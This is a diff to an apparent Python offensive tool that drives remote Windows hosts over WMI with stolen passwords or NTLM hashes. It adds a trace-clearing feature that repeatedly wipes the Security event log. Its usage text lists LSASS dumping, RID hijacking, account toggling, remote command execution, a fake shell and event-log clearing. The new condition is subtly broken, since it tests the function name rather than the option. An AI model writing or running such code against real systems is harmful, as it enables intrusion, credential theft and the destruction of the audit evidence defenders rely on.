@@ -13,6 +13,7 @@ import module.dumpLsass
 import module.files
 import module.listdir
 import module.ridhijack
+import module.cleartrace
 import threading
 import logging
 import sys
@@ -127,6 +128,8 @@ def ridhijack(ip='', username='', password='',domain='',hashes='',aesKey='',ridl
 def set_user(ip='', username='', password='',domain='',hashes='',aesKey='',ridlist=""):
     module.ridhijack.user_set(ip, username, password, domain, hashes, aesKey,ridlist)
 
+def clear_trace(ip='', username='', password='',domain='',hashes='',aesKey=''):
+    module.cleartrace.cleartrace(ip, username, password, domain, hashes, aesKey)
 
 if __name__ == '__main__':
     parser=optparse.OptionParser()
@@ -161,6 +164,7 @@ if __name__ == '__main__':
     parser.add_option("--user-rid-query",action="store_true",dest="rid_query",help="Users RID Query")
     parser.add_option("--ridhijack",dest="rdihijack",help="RID hijack (--ridhijack <src_user_rid>,<target_user_rid>)")
     parser.add_option("--set-user",dest="setuser",help="Enable/Disable User(--setuser <rid>,1/0)")
+    parser.add_option("--cleartrace",action="store_true",dest="cleartrace",help="Clear usage traces")
     (option,args)=parser.parse_args()
     ip = option.ip
     if option.domain != None:
@@ -218,6 +222,8 @@ if __name__ == '__main__':
         ridhijack(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm,ridlist=option.rdihijack)
     elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.setuser:
         set_user(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm,ridlist=option.setuser)
+    elif option.ip and option.username and (option.password != None or option.ntlm != None) and clear_trace:
+        clear_trace(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm)
     else:
         print("Usage:\npython wmi_query -i <target> -u <username> -p <password> -g #Get Process List\n"
               "python wmi_query -i <target> -u <username> -p <password> -g -q #query Av/EDR/Process\n"
@@ -249,7 +255,7 @@ if __name__ == '__main__':
               "python wmi_query -i <target> -u <username> -p <password> --one_vbs <vbs_path> #vbs that only runs once\n"
               "python wmi_query -i <target> -u <username> -p <password> --execute_command <command> #To execute the command through Win32_ScheduledJob (NT 6.0), you need to wait for 1 minute\n"
               "python wmi_query -i <target> -u <username> -p <password> --clear_eventlog #cear eventlog logName:appllication,system,setup,forwardedevents,security\n"
-              "python wmi_query -i <target> -u <username> -p <password> --clear_eventlog --cycle_clear# This will execute clear EventLog vbs forever(To stop use --stop <uuid>)"
+              "python wmi_query -i <target> -u <username> -p <password> --clear_eventlog --cycle_clear# This will execute clear EventLog vbs forever(To stop use --stop <uuid>)\n"
               "python wmi_query -i <target> -u <username> -p <password> --execute_command2 <command> #execute command\n"
               "python wmi_query -i <target> -u <username> -p <password> --shell #Command execution mode 2 to get a fake shell\n"
               "python wmi_query -i <target> -u <username> -p <password> --writefile <file_path> --save-to-file <save_file_path># remote file writing\n"
@@ -261,5 +267,6 @@ if __name__ == '__main__':
               "python wmi_query -i <target> -u <username> -p <password> --user-rid-query #Users RID Query\n"
               "python wmi_query -i <target> -u <username> -p <password> --ridhijack 1f5(src_id),1f4(target_rid) #Rid Hijack Example\n"
               "python wmi_query -i <target> -u <username> -p <password> --set-user <rid>,0 #Disable User\n"
-              "python wmi_query -i <target> -u <username> -p <password> --set-user <rid>,1 #Enable User")
+              "python wmi_query -i <target> -u <username> -p <password> --set-user <rid>,1 #Enable User\n"
+              "python wmi_query -i <target> -u <username> -p <password> --cleartrace #Clear usage traces,On cycle clearEventLog Security")
         parser.print_help()
